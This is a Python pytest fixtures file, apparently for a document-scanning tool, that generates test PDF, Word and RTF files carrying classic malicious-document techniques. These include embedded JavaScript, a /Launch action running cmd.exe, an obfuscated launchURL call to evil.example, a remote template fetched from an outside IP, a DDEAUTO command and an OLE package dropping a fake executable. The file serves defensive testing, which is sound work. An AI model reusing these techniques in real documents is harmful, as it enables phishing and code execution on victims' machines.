"""Test fixtures. All samples are generated on the fly - no real malware is stored."""

from __future__ import annotations

import io
import struct
import zipfile
from pathlib import Path

import pytest
from pypdf import PdfWriter

FAKE_PE = b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00" * 56 + b"This program cannot be run in DOS mode."


def build_raw_pdf(objects: list[bytes], root: int = 1, trailer_extra: bytes = b"") -> bytes:
    """Assemble a structurally valid PDF (correct xref) from object bodies."""
    out = io.BytesIO()
    out.write(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
    offsets = []
    for i, body in enumerate(objects, 1):
        offsets.append(out.tell())
        out.write(b"%d 0 obj\n" % i + body + b"\nendobj\n")
    xref = out.tell()
    out.write(b"xref\n0 %d\n0000000000 65535 f \n" % (len(objects) + 1))
    for off in offsets:
        out.write(b"%010d 00000 n \n" % off)
    out.write(
        b"trailer\n<< /Size %d /Root %d 0 R >>\nstartxref\n%d\n%%%%EOF\n"
        % (len(objects) + 1, root, xref)
        + trailer_extra
    )
    return out.getvalue()


PAGE_OBJECTS = [
    b"<< /Type /Catalog /Pages 2 0 R >>",
    b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
    b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >>",
]


@pytest.fixture
def clean_pdf(tmp_path: Path) -> Path:
    w = PdfWriter()
    w.add_blank_page(200, 200)
    w.add_metadata({"/Author": "Alice", "/Title": "Quarterly report", "/Producer": "vet tests"})
    p = tmp_path / "clean.pdf"
    with p.open("wb") as fh:
        w.write(fh)
    return p


@pytest.fixture
def js_pdf(tmp_path: Path) -> Path:
    js = b"var s = unescape('%u9090%u9090'); eval(String.fromCharCode(97,108,101,114,116));"
    objs = [
        b"<< /Type /Catalog /Pages 2 0 R /Names << /JavaScript 4 0 R >> >>",
        PAGE_OBJECTS[1],
        PAGE_OBJECTS[2],
        b"<< /Names [(init) 5 0 R] >>",
        b"<< /Type /Action /S /JavaScript /JS 6 0 R >>",
        b"<< /Length %d >>\nstream\n" % len(js) + js + b"\nendstream",
    ]
    p = tmp_path / "js.pdf"
    p.write_bytes(build_raw_pdf(objs))
    return p


@pytest.fixture
def attachment_pdf(tmp_path: Path) -> Path:
    w = PdfWriter()
    w.add_blank_page(200, 200)
    w.add_attachment("invoice.exe", FAKE_PE)
    w.add_attachment("notes.txt", b"just some notes")
    p = tmp_path / "attach.pdf"
    with p.open("wb") as fh:
        w.write(fh)
    return p


@pytest.fixture
def launch_pdf(tmp_path: Path) -> Path:
    objs = [
        b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>",
        PAGE_OBJECTS[1],
        PAGE_OBJECTS[2],
        b"<< /Type /Action /S /Launch /Win << /F (cmd.exe) /P (/c calc.exe) >> >>",
    ]
    p = tmp_path / "launch.pdf"
    p.write_bytes(build_raw_pdf(objs))
    return p


@pytest.fixture
def obfuscated_pdf(tmp_path: Path) -> Path:
    objs = [
        b"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>",
        PAGE_OBJECTS[1],
        PAGE_OBJECTS[2],
        b"<< /Type /Action /S /J#61vaScript /J#53 (app.launchURL\\('http://evil.example/x'\\)) >>",
    ]
    p = tmp_path / "obf.pdf"
    p.write_bytes(build_raw_pdf(objs))
    return p


@pytest.fixture
def uri_trailing_pdf(tmp_path: Path) -> Path:
    objs = [
        PAGE_OBJECTS[0],
        PAGE_OBJECTS[1],
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Annots [4 0 R] >>",
        b"<< /Type /Annot /Subtype /Link /Rect [0 0 50 50] "
        b"/A << /S /URI /URI (https://phish.example/login) >> >>",
    ]
    p = tmp_path / "uri.pdf"
    p.write_bytes(build_raw_pdf(objs, trailer_extra=b"A" * 200))
    return p


def _ooxml(path: Path, parts: dict[str, bytes]) -> Path:
    base = {
        "[Content_Types].xml": b'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>',
        "word/document.xml": b'<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body/></w:document>',
    }
    base.update(parts)
    with zipfile.ZipFile(path, "w") as zf:
        for name, data in base.items():
            zf.writestr(name, data)
    return path


@pytest.fixture
def clean_docx(tmp_path: Path) -> Path:
    return _ooxml(tmp_path / "clean.docx", {})


@pytest.fixture
def template_docx(tmp_path: Path) -> Path:
    rels = (
        b'<?xml version="1.0"?>'
        b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        b'<Relationship Id="rId1" '
        b'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
        b'Target="http://198.51.100.7/template.dotm" TargetMode="External"/>'
        b"</Relationships>"
    )
    return _ooxml(tmp_path / "template.docx", {"word/_rels/settings.xml.rels": rels})


@pytest.fixture
def dde_docx(tmp_path: Path) -> Path:
    doc = (
        b'<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        b'<w:body><w:p><w:r><w:instrText> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc" </w:instrText>'
        b"</w:r></w:p></w:body></w:document>"
    )
    return _ooxml(
        tmp_path / "dde.docx",
        {"word/document.xml": doc, "word/embeddings/oleObject1.bin": b"\xd0\xcf\x11\xe0fake"},
    )


def _ole1(class_name: bytes, native: bytes) -> bytes:
    """OLE 1.0 embedded object (MS-OLEDS 2.2) as stored in RTF \\objdata."""

    def lp_string(s: bytes) -> bytes:
        return struct.pack("<I", len(s) + 1) + s + b"\0"

    return (
        struct.pack("<II", 0x0501, 2)  # OLE version, format id = embedded
        + lp_string(class_name)
        + struct.pack("<II", 0, 0)  # empty topic and item names
        + struct.pack("<I", len(native))
        + native
    )


def _rtf_with_object(class_name: bytes, native: bytes) -> bytes:
    objdata = _ole1(class_name, native).hex().encode()
    return (
        b"{\\rtf1\\ansi{\\object\\objemb{\\*\\objclass "
        + class_name
        + b"}{\\*\\objdata "
        + objdata
        + b"}}}"
    )


@pytest.fixture
def package_rtf(tmp_path: Path) -> Path:
    temp = b"C:\\Users\\victim\\AppData\\Local\\Temp\\invoice.exe\0"
    native = (
        struct.pack("<H", 2)
        + b"invoice.exe\0"
        + b"C:\\Users\\attacker\\invoice.exe\0"
        + struct.pack("<II", 0x00030000, len(temp))
        + temp
        + struct.pack("<I", len(FAKE_PE))
        + FAKE_PE
    )
    p = tmp_path / "package.rtf"
    p.write_bytes(_rtf_with_object(b"Package", native))
    return p


@pytest.fixture
def equation_rtf(tmp_path: Path) -> Path:
    p = tmp_path / "equation.rtf"
    p.write_bytes(_rtf_with_object(b"Equation.3", b"\x1c\x00" + b"\x41" * 64))
    return p
